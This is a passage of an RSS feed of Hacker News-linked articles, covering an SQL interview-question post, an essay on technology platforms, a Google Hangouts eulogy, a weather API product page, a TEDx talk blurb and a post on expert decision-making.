<code>UNION</code> vs <code>UNION ALL</code>? What if there were no duplicates?</li><li>What's the difference between <code>COUNT</code>and <code>COUNT DISTINCT</code>?</li><li>When would you use a <code>HAVING</code> clause versus a <code>WHERE</code> clause?</li></ul><p><strong>Basic SQL Question Example:</strong></p><figure><img src="https://blog.interviewquery.com/content/images/2021/01/image.png" alt="" srcset="https://blog.interviewquery.com/content/images/size/w600/2021/01/image.png 600w, https://blog.interviewquery.com/content/images/size/w1000/2021/01/image.png 1000w, https://blog.interviewquery.com/content/images/2021/01/image.png 1306w" sizes="(min-width: 720px) 720px"></figure><blockquote><em>We're given two tables, a <code>users</code> table with demographic information and the neighborhood they live in and a <code>neighborhoods</code> table.</em></blockquote><blockquote><em>Write a query that returns all of the neighborhoods that have 0 users.</em></blockquote><p>Try answering this question with our <a href="https://www.interviewquery.com/questions/empty-neighborhoods">interactive SQL editor</a>.</p><p><strong>Here's a hint:</strong></p><p><em>Our predicament is to find all the neighborhoods without users that live in them. This means we have to introduce a <strong>concept of existence of a field in one table, while not existing in another.</strong></em></p><p><em>For example, let's say we generate some fake data of user's and the neighborhoods they live in. We would expect it to look something like this. </em></p><pre><code>neighborhoods.name  | users.id
____________________|__________
castro              | 1
castro              | 2
cole valley         | null
castro heights      | 3
sunset heights      | 4</code></pre><p><em>We see each user from one to four is appropriately placed in their respective neighborhood except for the neighborhood of Cole Valley. That's the neighborhood we're targeting for returning in our query. </em></p><p><em>Strategies: whenever the question asks about finding values with 0 something (users, employees, posts, etc..), immediately think of the concept of <strong><code>LEFT JOIN</code></strong>! An inner join finds any values that are in both tables, <strong>a left join keeps only the values in the left table</strong>.</em></p><p><em>Our predicament is to find all the neighborhoods without users. To do this, we must do a left join from the <code>neighborhoods</code> table to the <code>users</code> table.</em></p><p><em>If we then add in a where condition of <strong><code>WHERE users.id IS NULL</code></strong>, we will get every single neighborhood …</em></p></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.interviewquery.com/blog-sql-interview-questions/">https://www.interviewquery.com/blog-sql-interview-questions/</a></em></p>]]>
            </description>
            <link>https://www.interviewquery.com/blog-sql-interview-questions/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25709870</guid>
            <pubDate>Sun, 10 Jan 2021 04:15:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Platform Is the Enemy]]>
            </title>
            <description>
<![CDATA[
Score 92 | Comments 20 (<a href="https://news.ycombinator.com/item?id=25708099">thread link</a>) | @nomdep
<br/>
January 9, 2021 | https://danielbmarkham.com/the-platform-is-the-enemy/ | <a href="https://web.archive.org/web/*/https://danielbmarkham.com/the-platform-is-the-enemy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div id="post-body">
        <p>The premise of the movie "Idiocracy" is simple: in the future mankind has de-evolved into morons. Technology does so much for everybody that nobody knows how it all works anymore. &nbsp;If we can't fix it, we're all going to die.</p><p>One character asks the other what he likes, The answer is money.</p><p>"I can't believe you like money too!" the first character says without irony, "We should hang out!"</p><figure><img src="https://cdn.danielbmarkham.com/2021/01/JRJcXbeoSOlkRRzbC7HJ_idiocracy.jpg" alt=""></figure><p>The gag here is that of course, most everybody likes money. If you reduce all of your life enough, it's just food, sex, money, and looking cool. But who would want to do that? Over the centuries, humans have created massively-complex societies because everybody has different things they like doing and thinking about, but all of that complexity can be reduced to, well, an idiocracy if you try hard enough.</p><p>The movie, however, is just a joke, right? We would never allow that to happen, of course, because that's not the goal of technology. Technology's goal is to make us better, not dumber.</p><p>Wait one. Is that true? What <em>is</em> the goal of technology, anyway? Has anybody ever clearly stated it?</p><p>Recently I've heard two goals:</p><ol><li>The goal of technology is to become a <strong>brain extension</strong>, <em>helping you to decide what to do</em> and then helping you get it done.</li><li>The goal of technology is to become a <strong>hand-held power tool</strong>, helping you accomplish the things you've <em>already decided to do</em></li></ol><p>That's not the same thing. It turns out the difference is critical.</p><p>The old goal was much simpler: make something people want. I like that goal! It boils down the job of creating technology to the most important parts, need and ability. But was that sustainable? At the end of the day, don't we always end up making some combination of stuff that either helps us <em>make decisions</em> or helps us <em>implement decisions</em> we've already made? And aren't the two fundamentally incompatible in a future society?</p><p>Yelp tells you which restaurant to go to. Your GPS automatically takes you there. These are not just different problems, they're different <em>kinds of problems</em>. Getting from point A to point B is a matter of math and geometry. Which restaurant is the best tonight? You could spend hours debating that with friends.</p><p>If you reduce anything down enough it becomes idiotic. Each piece of technology we deploy can have the goal of helping us do what we've already decided or helping us decide what to do. The first option leaves the thinking up to us. The second option "helps" us think.</p><figure><iframe width="267" height="200" src="https://www.youtube.com/embed/sZHCVyllnck?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><p>You like money too? Wow! I like money! We should hang out!</p><p>Human brains are not computers. Brains are designed to help us survive and pass on our genes using the minimum amount of energy available. If the GPS takes me where I'm going, I don't need to know how to use maps anymore. So I stop knowing how to use maps. Dump those neurons, they're not needed. If Yelp picks the restaurants for me enough, I stop having nuanced preferences about restaurants. That energy expenditure is no longer needed for survival and reproduction. Dump those neurons. Over time people stop caring about the tiny details of what the difference is between a good and a great restaurant. Yelp handles that.</p><p>For some folks, who cares? It's food. Go eat it. For other folks, picking the right place can be a serious undertaking, worthy of heavy thought and consideration. But if over the years apps like Yelp boil all of that down to four or five stars, then our collective brain is not going to bother with it. Human brains are not computers. If computers do the work for us, we turn off those neurons and save energy.</p><p>Meanwhile, on social media there's currently this huge discussion. One bunch of folks says that social media is being overbearing in its censorship of fringe and sometimes hateful opinions. The other bunch of folks says social media is a festering sore full of people who are ugly, hateful, and abusive to those weakest among us. The community has to set standards.</p><p>There doesn't have to be a right and wrong here. I think the crucial thing to to understand that both sides can be entirely correct. We are dealing with the same kind of question.</p><p>All three of these topics -- whether humanity is becoming idiots or not, what the ultimate goal of technology is or should be, and how social media should work -- are intricately related. They're related because of this: <em>the platform is the enemy</em>.</p><p>The minute we create a platform for something, whether it's rating movies, tracking projects, or chatting with friends about work, as that platform takes over mindshare, <em>the assumption becomes that this is a solved problem</em>.</p><p>The telephone was great. Once we had the telephone, people didn't have to worry about how to talk to people far away anymore. Just pick up the phone. Solved problem.</p><p>Facebook is great. Once we had Facebook, people didn't have to worry about how to interact with their friends in a social setting anymore. Just click on the little FB notification (Which seems to be always flashing for some reason to get my attention) Solved problem?</p><p>But these are entirely different things! With the phone, I know who I want to call and why. I push buttons and we are connected. The tech helps me do what I've already decided to do. With Facebook, on the other hand, they get paid to show me things in a certain order. The premise is that I'm waiting (or "exploring" if you prefer) until I find something to interact with. The phone is a tool for me to use. I am the tool Facebook is using. I am no longer acting. I am reacting.</p><p>And even if they weren't paid, interacting with friends socially is an extremely complex affair. What kind of mood are they in? What's their life history? What things are bad to bring up? How does their body language look? Facebook's gimmick is "Hey, we've reduced all of this to bits and bytes, and we'll even show you what bits and bytes to look at next!"</p><p>Solved problem.</p><p>Many, many people do not use the internet, the internet uses them. And this percentage is constantly growing.</p><figure><img src="https://cdn.danielbmarkham.com/2021/01/9EBNeUmSy6TMDUpKTLL6_terminator-robot.jpg" alt=""></figure><p>Just like the restaurant example, maybe that's fine. I have friends, I have opinions, who cares? It's all idle chat anyway.</p><p>That logic can be true for a bunch of things, but can't be true for <em>everything</em>. Otherwise, at some point 100 years from now, we're comparing our life values and end up saying something like "I like money too". Everything can't all be reduced down to the lowest common denominator. If it does, we all die.</p><p>Life is not a bit or byte, a number to be optimized. It's meaning we define ourselves, in ways we should not quantize.</p><p>Platforms, by their very nature, constantly send out the subtle message: <em>This is a solved problem. No further effort on your part is required here. No thinking needed.</em> Platforms resist change. They resist their own evolution by subtly poisoning the discussion before it even starts.</p><p>Are restaurant choices more or less important than which movie to watch tonight? There's no right or wrong answer to these questions. We have nice categories like restaurants and movies because currently people consider those things to be different kinds of choices. But why? If the algorithm is king, why shouldn't an algorithm determine both of those things for me? And if it does, why should I bother with worrying about which category is which?</p><p>Human brains are not computers. Let the platform decide. Energy not needed. Dump those neurons.</p><p>This is the more important point. It's not that the platforms turn what might be complex things into simple numbers, or even that they monetize attention. It's that by turning everything into numbers, over time they destroy the distinction between the categories entirely. Platforms are the enemy because they resist analysis in the areas they dominate.</p><p>Platforms turn into settled fact things that should be open for debate, like whether or not Taco Bell is a Mexican restaurant, or whether Milo is an artist with something useful to tell us. (I'm going with "no" and "no" for both of these.) More dangerously, they do the work of deciding <em>what categories various things go into</em>. This category over here is important. That category over there is not. We all make these decisions, and they're all different, and the categories each of us pays careful attention to and loves obsessing about are all different, and because we all have different viewpoints and priorities humankind advances in thousands of directions simultaneously. We survive. We evolve.</p><p>Twitter has to decide whether PERSON_X can speak or not because on the Twitter platform, that question has to have a yes or no answer based on the person. Twitter's category for deciding who can speak is "who is that?" Is that the right category for social conversations? For political conversations? For conversations about philosophy? Math? Who knows? Who cares? Twitter has decided. Solved problem.</p><p>Everybody has different things they like doing and thinking about. Different conversations and audiences have different criteria. Some problems should never be solved. Or rather more directly, some problems should never have a universal answer.</p><p>An aside: We see the same thing in programming. One bunch of folks creates various platforms in order to do the thinking for another bunch of folks. Sometimes these platforms take off and become industry standards. That's quite rare, however. Most of the time we end up training morons who can weakly code against the platform but can't reason effectively about the underlying architecture or reason for the platform to exist in the first place. In our desire to help, we harm the very people we're trying to assist -- by subtly giving them the impression that this is a solved problem. Programmers are just a decade or so ahead of the rest of us.</p><p>Popular platforms aren't just a danger economically because they control commerce. They're not just a danger politically because they selectively control and amplify political discourse. They're an extinction-level, existential danger to humans because they prevent people from seriously considering what kinds of categories are important in …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://danielbmarkham.com/the-platform-is-the-enemy/">https://danielbmarkham.com/the-platform-is-the-enemy/</a></em></p>]]>
            </description>
            <link>https://danielbmarkham.com/the-platform-is-the-enemy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25708099</guid>
            <pubDate>Sun, 10 Jan 2021 02:23:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Podcast on innovation systems, with Ben Reinhardt]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25707442">thread link</a>) | @willbobaggins
<br/>
January 9, 2021 | https://narrativespodcast.com/2020/12/21/21-innovation-systems-with-ben-reinhardt/ | <a href="https://web.archive.org/web/*/https://narrativespodcast.com/2020/12/21/21-innovation-systems-with-ben-reinhardt/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1985">

                    
                    <div>
                        
<p>In this episode, we talk with Ben Reinhardt about different innovation systems, how to create more sci-fi technology a reality, and why our research institutions are not as effective as they used to be. You can check out Ben’s work at https://benjaminreinhardt.com/about/.</p>



<div><p>Some things mentioned in the episode: </p><p><a href="https://slatestarcodex.com/2020/05/12/studies-on-slack/">Studies on Slack</a></p></div>



<p><a href="https://en.wikipedia.org/wiki/Donald_Braben">Don Braben</a></p>



<p><a href="https://en.wikipedia.org/wiki/DARPA">DARPA</a></p>



<p>Ben’s <a href="https://twitter.com/ben_reinhardt?lang=en">Twitter</a></p>



<figure></figure>
                                            </div>

                </article></div>]]>
            </description>
            <link>https://narrativespodcast.com/2020/12/21/21-innovation-systems-with-ben-reinhardt/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25707442</guid>
            <pubDate>Sun, 10 Jan 2021 01:30:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google Hangouts: A Eulogy]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25707127">thread link</a>) | @dredmorbius
<br/>
January 9, 2021 | http://decafbad.net/2021/01/09/google-hangouts-a-eulogy/ | <a href="https://web.archive.org/web/*/http://decafbad.net/2021/01/09/google-hangouts-a-eulogy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<!-- /.post-info -->      <p>This year Google will stop supporting and remove Google Hangouts. Google Hangouts, if you're not aware, was Google's replacement for their chat program Google Talk. Google Talk was a XMPP-based chat client that was available for all users of Google services. Google Hangouts was rolled out around the same time as Google+, and was a wrapper for many different Google services (phone, video chats, and Hangouts on Air). What was nice about it was that anyone that you knew the GMail address of had access to Google Hangouts. This meant that many of my friends had Hangouts access. JoDee and I used Hangouts for much of our IM communication. Unfortunately for whatever reason Google decided to remove yet another of the things that I liked about Google services, and proves once again that Google can't be trusted with any social platform.</p>
<p>Today I downloaded the "Google Takeout" of Hangouts and removed all of the old chats. There were a lot of nice memories in there, and now they can live in a collection of photos and one long JSON dump file that I'll probably never read again.</p>
<p>If you want to find me I'm on Signal and Quicksy (an XMPP-based service using phone numbers and OMEMO for encryption). If you have my phone number you can use these services to get a hold of me. I'm still on IRC and have accounts on other platforms. But what seems a constant is that communication will be fractured over multiple platforms and the dream of having one application doing everything well dies on July, 2021. And the irritation of having yet-another-platform to talk to that one person is the reality we'll all have to deal with until something better comes along. Nothing is perfect and everything is terrible.</p>
<p>RIP Hangouts. You helped me not have to think about messaging.</p>
    </div></div>]]>
            </description>
            <link>http://decafbad.net/2021/01/09/google-hangouts-a-eulogy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25707127</guid>
            <pubDate>Sun, 10 Jan 2021 01:07:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Facebook and Twitter Promote Propaganda and Disinformation. We Can Do Better]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25706694">thread link</a>) | @dyoder
<br/>
January 9, 2021 | https://byline.dashkite.com/post/dashkite/w_ljVZkIbMtrtkekpwUnBg/facebook-and-twitter-promote-propaganda-and-disinformation | <a href="https://web.archive.org/web/*/https://byline.dashkite.com/post/dashkite/w_ljVZkIbMtrtkekpwUnBg/facebook-and-twitter-promote-propaganda-and-disinformation">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://byline.dashkite.com/post/dashkite/w_ljVZkIbMtrtkekpwUnBg/facebook-and-twitter-promote-propaganda-and-disinformation</link>
            <guid isPermaLink="false">hacker-news-small-sites-25706694</guid>
            <pubDate>Sun, 10 Jan 2021 00:19:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Weather Data API with historical weather and 15-day forecast data]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25706592">thread link</a>) | @Leftium
<br/>
January 9, 2021 | https://www.visualcrossing.com/weather-api | <a href="https://web.archive.org/web/*/https://www.visualcrossing.com/weather-api">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="posts">
					
					
						<div id="">
								
								<p><a href="https://github.com/visualcrossing/WeatherApi/" title="Weather API Samples"><img src="https://www.visualcrossing.com/images/excel-weather/coder_300x200.png" alt="Weather API for JavaScript and web development"></a>
								</p>
								<div>
									
									
									<div>
										<p>
											Visual Crossing Weather API requests are RESTful calls that you can make easily from both client and server.  
											You can incorporate weather data into your application, website or weather app in a matter of minutes. 
											Simply follow our tutorials and sample code. Need a free weather api? Our weather data API is free up to 1000 results/day.
										</p>

										<ul>
											<li><i></i>Easy integration with <a href="https://www.visualcrossing.com/resources/documentation/weather-api/how-to-load-weather-data-in-javascript/" title="How to load weather data in JavaScript">JavaScript, D3 &amp; jQuery</a></li>
											<li><i></i>HTTPS encryption for security and compliance</li>
											<li><i></i>Cross-Origin Resource Sharing (<a href="https://enable-cors.org/" `rel="noopener" title="enable cross-origin resource sharing" target="_blank">CORS</a> ) for secure cross-domain requests</li>
											<li><i></i>Secure API Key for account protection &amp; tracking</li>
											<li><i></i>Compatible for both client and server usage</li>
											<li><i></i>Enable weather in your application in minutes</li>
										</ul>
									</div>

								</div>
						</div>
					
						
						
						
						<div id="">
								
								<p><a href="https://www.visualcrossing.com/resources/documentation/weather-api" title="Weather API Documentation"><img src="https://www.visualcrossing.com/images/excel-weather/coder_300x200.jpg" alt="Historical Weather Data for Java, Python, Perl"></a>
								</p>
								<div>
									
									
									<div>
											<p>
										RESTful APIs are ideal for integration in all programming languages including Java, .NET, Python &amp; Perl.  
										Access the entire Visual Crossing Weather database including weather history data, weather forecasts, real time conditions to power any application.
										</p>
										
										<p>
										Results are available in common data formats including JSON and CSV.
										Integrating the data into your application is straightforward.
										</p>
										<ul>
											<li><i></i>Full access to historical weather, forecasts, and climate statistics</li>
											<li><i></i>Data formats include JSON and CSV</li>
											<li><i></i>Support for multiple locations and dates in a single request</li>
											<li><i></i>Documentation and samples available</li>
										</ul>
									</div>
								</div>
						</div>
						
						
						
					
						<p id="">
							<h2>Weather Data for Data Science</h2>
						</p>
						<div id="">
								
								
								<div>
									
									
									<div>
										<p>
											R has become an essential environment for statistical computing and data science.  
											It is widely used among analysts and data miners for developing statistical software and data analysis including weather. 
											Visual Crossing API can be used to load data into your R code quickly and easily.

										</p>
										<ul>
											<li><i></i>Load weather information with a single call</li>
											<li><i></i>Use R to calculate statistics, do analysis &amp; make graphics</li>
											<li><i></i>Build queries using the Query Builder page or in your code</li>
											<li><i></i>Join weather data with other business data</li>
											<li><i></i>Videos and tutorials show the process step-by-step</li>
										</ul>
									</div>

								</div>
						</div>
						

						<div id="">
								
								
								<div>
									
									
									<div>
										<p>
										
										Excel is used by corporate analysts and home users alike because it is powerful, intuitive. 
										It provides a simple weather analysis platform business and for students and data hobbyists.  
										Our unique CSV output mode allows the results of weather queries to be consumed directly in any Excel workbook.

										</p>
										<ul>
											<li><i></i>Load weather query results directly via an API URL</li>
											<li><i></i>Save and share your weather analysis</li>
											<li><i></i>Make and test queries using our Weather Query Builder</li>
											<li><i></i>Automatically update weather conditions via live queries within Excel</li>
											<li><i></i>Sample workbooks available to use directly and build upon</li>
										</ul>
									</div>

								</div>
						</div>
						
						<div id="">
								
								
								<div>
									
									
									<div>
										<p>
										
									Power BI is an interactive business intelligence tool designed to be simple enough for end users create their own analyses while being powerful enough for business-wide use.  
									Weather data fits naturally into this analysis framework, and Visual Crossing Weather makes the integration easy.  
									Our API query URLs can return CSV results that import directly into any Power BI report or dashboard.

										</p>
										<ul>
											<li><i></i>Find valuable correlations between any data and weather</li>
											<li><i></i>Load weather data directly from our cloud-based servers</li>
											<li><i></i>Save and share weather reports and dashboard across your team</li>
											<li><i></i>Samples get you up and running quickly</li>
										</ul>
									</div>

								</div>
						</div>
	

	
	

						<div id="">
								
								<p><a href="https://www.visualcrossing.com/resources/documentation/weather-api" title="Weather API Documentation">
									<img src="https://www.visualcrossing.com/images/excel-weather/bi_300x200.png" alt="Loading weather data into your Business Intelligence System"></a>
								</p>
								<div>
									
									
									<div>
									<p>
										High-end BI platforms represent the backbone of data analysis within many large and mid-sized companies.  
										These powerful tools can crunch decades of business and external data to find patterns and make recommendations.  
										Visual Crossing Weather can be easily embedded directly into every BI application.


										</p>
										<ul>
											<li><i></i>Find valuable correlations between your business data and weather</li>
											<li><i></i>ETL scripts, plug-ins, and sample dashboards available</li>
											<li><i></i>Import weather data into your corporate warehouse</li>
											<li><i></i>Get added value from your existing BI investment</li>
										</ul>
									</div>

								</div>
						</div>
						
						<div id="">
								
								
								<div>
									
									
									<div>
										<p>
											Google Sheets has become the most universally accessible data analysis application due to the global reach of its web-based platform.  
											That same web platform powers instant data sharing in schools, companies, and around the world.  
											Visual Crossing Weather data can be integrated easily into any Google Sheet application using a single API call.

										</p>
										<ul>
											<li><i></i>Directly load history and forecast weather data into any Sheet</li>
											<li><i></i>Update live weather results directly in Google Sheets</li>
											<li><i></i>Share weather data analysis instantly</li>
											<li><i></i>Ideal for academic and education users</li>
										</ul>
									</div>

								</div>
						</div>
						
	
						<p id="">
							<h2>Databases</h2>
						</p>
						<div id="">
								
								<p><a href="https://www.visualcrossing.com/weather/weather-data-services" title="Weather Data Query Builder"><img src="https://www.visualcrossing.com/images/excel-weather/server_300x200.png" alt="Weather Data for Databases - Data Loading, Live Updates, Enterprise Access"></a>
							
								</p>
								<div>
									
									
									<div>
										<p>
											An enterprise data warehouse is the heart of data science for nearly every large and mid-sized corporation.  
											The power to store vast amounts of business data enable analysts across an organization make intelligent business decisions.
											Visual Crossing Weather allows historical weather data to be matched directly to existing business records.
										</p>
										<p>											
											Many business activities are affected by weather.
											Adding Visual Crossing data to an enterprise data warehouse bring immediate inside and ROI.
										</p>
										<ul>
											<li><i></i>Easily load weather data using ETL and embedded queries</li>
											<li><i></i>Dynamic queries load fresh weather data automatically</li>
											<li><i></i>Compatible with application across the enterprise</li>
											<li><i></i>Every part of the organization can find new insight</li>
										</ul>
									</div>

								</div>
						</div>
						
					</div></div>]]>
            </description>
            <link>https://www.visualcrossing.com/weather-api</link>
            <guid isPermaLink="false">hacker-news-small-sites-25706592</guid>
            <pubDate>Sun, 10 Jan 2021 00:05:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[‘Why I, as a black man, attend KKK rallies.’ [video]]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25705798">thread link</a>) | @boogies
<br/>
January 9, 2021 | https://invidious.site/watch?v=ORp3q1Oaezw&dark_mode=true&autoplay=1 | <a href="https://web.archive.org/web/*/https://invidious.site/watch?v=ORp3q1Oaezw&dark_mode=true&autoplay=1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>
                A chance encounter with members of the Ku Klux Klan led black musician Daryl Davis on a quest to determine the source of the hate. His unorthodox, yet simple approach, has wielded surprising results and just might be the solution for all racial discourse.</p><p>Daryl Davis graduated from Howard University with a degree in Jazz. As a pianist, vocalist, and guitarist, he performs nationally and internationally with The Daryl Davis Band. He has also worked with such notables as Chuck Berry, Elvis Presley’s Jordanaires, The Legendary Blues Band, and many others.</p><p>In 1983, A chance occurrence after one of his performances led him to befriend a member of the Ku Klux Klan. This eventually led Daryl to become the first black author to travel the country interviewing KKK leaders and members, all detailed in his book, Klan-Destine Relationships. Today, Daryl owns numerous Klan robes and hoods, given to him by active members who became his friends and renounced the organization.</p><p>Since his journey began, Davis has joined an all-white country band, attended KKK rallies, and accepted a “certificate of friendship” from the Traditionalist American Knights of the KKK. He’s even the godfather of former Klan Imperial Wizard Roger Kelly’s granddaughter.</p><p>Davis has received the Elliott-Black and MLK awards as well as numerous other local and national awards for his work in race relations, and is often sought by media outlets as a consultant on the KKK and race relations. He is also an actor with stage and screen credits, appearing in the critically acclaimed HBO police drama, The Wire, and most recently, as the subject of the documentary Accidental Courtesy, which filmed his real life encounters with Ku Klux Klan and neo-Nazi leaders as he helps to dismantle racism across the United States</p><p> Davis has received the Elliott-Black and MLK awards as well as numerous other local and national awards for his work in race relations, and is often sought by media outlets as a consultant on the KKK and race relations. He is also an actor with stage and screen credits, appearing in the critically acclaimed HBO police drama, The Wire, and most recently, as the subject of the documentary Accidental Courtesy, which filmed his real life encounters with Ku Klux Klan and neo-Nazi leaders as he helps to dismantle racism across the United States. This talk was given at a TEDx event using the TED conference format but independently organized by a local community. Learn more at <a href="https://www.ted.com/tedx">https://www.ted.com/tedx</a></p></div></div>]]>
            </description>
            <link>https://invidious.site/watch?v=ORp3q1Oaezw&amp;dark_mode=true&amp;autoplay=1</link>
            <guid isPermaLink="false">hacker-news-small-sites-25705798</guid>
            <pubDate>Sat, 09 Jan 2021 22:44:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Putting Mental Models to Practice Part 4: Expert Decision Making]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25705441">thread link</a>) | @gHeadphone
<br/>
January 9, 2021 | https://commoncog.com/blog/putting-mental-models-to-practice/ | <a href="https://web.archive.org/web/*/https://commoncog.com/blog/putting-mental-models-to-practice/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
        <p><em>This is Part 4 of a <a href="https://commoncog.com/blog/a-framework-for-putting-mental-models-to-practice/">series of posts</a> on putting mental models to practice. In <a href="https://commoncog.com/blog/a-framework-for-putting-mental-models-to-practice-part-1/">Part 1</a> I described my problem with Munger’s approach to mental models after I applied it to my life. In <a href="https://commoncog.com/blog/putting-mental-models-to-practice-part-2-introduction-to-rationality/">Part 2</a> I argued that the study of rationality is a good place to start for a framework of practice. We learnt that <a href="https://fs.blog/mental-models/">Farnam Street’s list of mental models</a> consists of three types of models: descriptive models, thinking models concerned with judgment (epistemic rationality), and thinking models concerned with decision making (instrumental rationality). In <a href="https://commoncog.com/blog/putting-mental-models-to-practice-part-3-better-trial-and-error/">Part 3</a>, we were introduced to the search-inference framework for thinking, and discussed how mental models from instrumental rationality may help prevent the three errors of thinking as prescribed by the search-inference framework. We also took a quick detour to look at optimal trial and error through the eyes of Marlie Chunger. In Part 4, we will explore the idea that expertise leads to its own form of decision making. This is where my views begin to diverge from Farnam Street’s.</em></p><p>Many experts, in many fields, don’t do the sort of thinking we have explored in our previous part. They don’t do rational choice analysis. They don’t do expected utility calculations. &nbsp;They don’t adjust for biases, they don’t do appropriate search-inference thinking and they don’t use a ‘latticework of mental models from other fields’ to draw inferences.</p><p>And yet, despite a lack of grounding in the ‘best practices’ of decision science, they appear to perform remarkably well in the real world.</p><p>So what do they do?</p><p>They do <a href="https://en.wikipedia.org/wiki/Recognition_primed_decision">recognition-primed decision making</a>.</p><p>Recognition-primed decision making (henceforth called RPD) is a <em>descriptive</em> model of decision-making: that is, it describes how humans make decisions in real world environments. RPD is one of the thinking models from the field of <a href="https://en.wikipedia.org/wiki/Naturalistic_decision-making">Naturalistic Decision Making</a> (NDM), which is concerned with how practitioners <em>actually</em> make decisions on the job. NDM researchers eschew the lab and embed themselves in organisational settings, and take an almost anthropological approach to research. They follow firefighters on calls, sit in tanks during military exercises, and interview interface designers and programmers in the office, during work tasks. The way the researchers do this is to use an interviewing technique they call Cognitive Task Analysis, which is designed to draw out <em>tacit mental models of expertise</em>.</p><p>NDM is interesting to us because it represents an alternative school of thought to conventional decision analysis. The growth of the cognitive biases and heuristics research program has created a number of prescriptive models — rooted in expected utility theory — designed to help us make more ‘rational’ decisions. We’ve covered the basics of that approach in <a href="https://commoncog.com/blog/putting-mental-models-to-practice-part-3-better-trial-and-error/">Part 3</a>. But the cognitive biases and heuristics program has also sucked up a lot of attention in recent years. We continually hear endless stories about the fallibility of human judgment and the errors and biases that systematically cloud our thinking. Whatever popular science books have to say about NDM is limited to the sort of ‘magical intuition’ as portrayed by Malcolm Gladwell in <em>Blink</em>.</p><p>This is a terrible portrayal. Because expert intuition is often portrayed as ‘magical’, we ignore it and turn to more rational, deliberative modes of decision making. We do not believe that intuition can be trained, or replicated. We think that rational choice analysis is the answer to everything, and that amassing a large collection of mental models in service of the search-inference framework is the ‘best’ way to make decisions.</p><p>It is telling, however, that the US military uses RPD models for training and analysis of battlefield decision-making situations. The field of NDM arose out of psychologist Gary Klein’s work, done in the 90s, for the US Army Research Institute for the Behavioural and Social Sciences. In the 70s and the 80s, the US Government had spent millions on decision science research — that is, on <em>conventional</em> models rooted in rational choice analysis — and used these findings to develop expensive decision aids for battle commanders.</p><p>The problem they discovered was that nobody actually used these aids in the real world. The army had spent ten years worth of time and money on research that didn’t work at all. It needed a new approach. <em>(Chapter 2, Gary Klein, Sources of Power)</em>.</p><h2 id="how-experts-make-decisions">How Experts Make Decisions</h2><p>RPD describes the decision making that emerges from expertise. This is a huge differentiating factor; the majority of results in classical decision science was built on behavioural experiments performed on ordinary people. The model goes as follows:</p><p>Let’s say that an expert encounters a problem in the real world. The first step in the RPD model is recognition: that is, the expert perceives the situation in a changing environment and pattern matches it against a collection of prototypes. The more experience she has, the more prototypes or analogues she has stored in her <a href="https://en.wikipedia.org/wiki/Implicit_memory">implicit memory</a>.</p><p>This instantly generates four things. The first is a set of ‘expectancies’ — the expert has some expectations for happens next. For instance, in a firefighting environment, an experienced firefighter can tell where a fire would travel, and how a bad situation might develop. An experienced computer programmer can glance at some code and tell if the chosen abstraction would lead to problems months down the road. A manager can hear two pieces of information during lunch and predict production delays two months in the future.</p><p>The second thing this recognition generates is a set of <em>plausible goals</em> — that is, priorities of what needs to be accomplished. In a life-or-death situation, a platoon commander has to prioritise between keeping his troop alive, getting to advantageous cover, and achieving mission objectives. His recognised prototype instantly tells him where his priorities lie in a given situation, freeing cognitive resources to conduct other forms of thinking.</p><p>The third thing that is generated is a set of relevant cues. A novice looking at a chaotic situation will not notice the same things that the expert does. Noticing cues to evaluate a changing environment is one of the benefits of experience — and it is necessary in order to prevent information overload. Think of driving a car: in the beginning, you find yourself overwhelmed with the number of dials and knobs and mirrors you have to keep track of. After a few months, you do these things intuitively and notice only select cues in your environment as you drive.</p><p>Last, but not least, a sequence of actions is generated by the expert, sometimes called an ‘action script’ — and it presents itself, fully formed, in the expert’s head.</p><figure><img src="https://commoncog.com/blog/content/images/2019/01/Paper.Commonplace.42.png" alt=""></figure><p>The fact that RPD depends so much on implicit memory means that this entire process happens in a blink of an eye. Consider how you might recognise a person walking into the room as your friend ‘Mary’ or ‘Joe’. Facial recognition is an implicit memory task: the information ‘magically’ makes itself known to you. Similarly, an expert confronted with a work-related problem will perform the recognition and generate the four by-products instantaneously. When initially interviewing firefighters, Klein’s researchers found that the firefighters would often assert that they were <em>not</em> decision making: instead, they arrived at the scene of a fire and knew immediately what to do.</p><p>This is, of course, not a complete picture. What happens when the situation is unclear, or when the initial diagnosis is flawed? Here’s a story from <em>Sources of Power</em> to demonstrate what happens next:</p><blockquote>“The initial report is of flames in the basement of a four-story apartment building: a one-alarm fire. The commander arrives quickly and does not see 